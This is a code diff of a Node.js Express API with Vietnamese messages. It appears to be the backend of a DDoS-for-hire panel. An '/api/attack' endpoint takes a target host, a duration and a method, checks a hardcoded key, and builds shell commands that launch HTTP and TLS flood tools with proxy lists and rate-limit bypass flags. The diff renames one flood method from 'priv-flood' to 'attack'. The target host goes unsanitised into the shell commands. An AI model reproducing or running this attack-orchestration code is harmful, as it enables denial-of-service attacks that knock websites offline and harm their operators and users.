@@ -25,7 +25,7 @@ const validateInput = ({ key, host, time, method, port }) => {
   if (key !== "negan") return "Invalid Key";
   if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
   if (port < 1 || port > 65535) return "Cổng không hợp lệ";
-  if (!["flood", "killer", "bypass", "tlskill", "priv-flood"].includes(method.toLowerCase())) {
+  if (!["flood", "killer", "bypass", "tlskill", "attack"].includes(method.toLowerCase())) {
     return "Phương thức không hợp lệ";
   }
   return null;
@@ -63,7 +63,7 @@ const killProcess = (process) => {
 
 // Xử lý các tiến trình và trả về danh sách PID đã dừng
 const pkillProcesses = async () => {
-  const processes = ["flood", "killer", "bypass", "tlskill", "priv-flood"];
+  const processes = ["flood", "killer", "bypass", "tlskill", "attack"];
   let pidList = [];
 
   for (let process of processes) {
@@ -99,8 +99,8 @@ app.get("/api/attack", (req, res) => {
     "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
     "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
     "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
-    "priv-flood": `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt -r 120 --delay 1 --ratelimit true --full true`,
-    "priv-flood": `node --max-old-space-size=65536 priv-flood -m POST -u ${host} -s ${time} -p live.txt -r 120 --delay 1 --ratelimit true --full true`
+    "attack": `node --max-old-space-size=65536 attack -m GET -u ${host} -s ${time} -p live.txt -r 120 --delay 1 --ratelimit true --full true`,
+    "attack": `node --max-old-space-size=65536 attack -m POST -u ${host} -s ${time} -p live.txt -r 120 --delay 1 --ratelimit true --full true`
   };
 
   const command = commands[method.toLowerCase()];
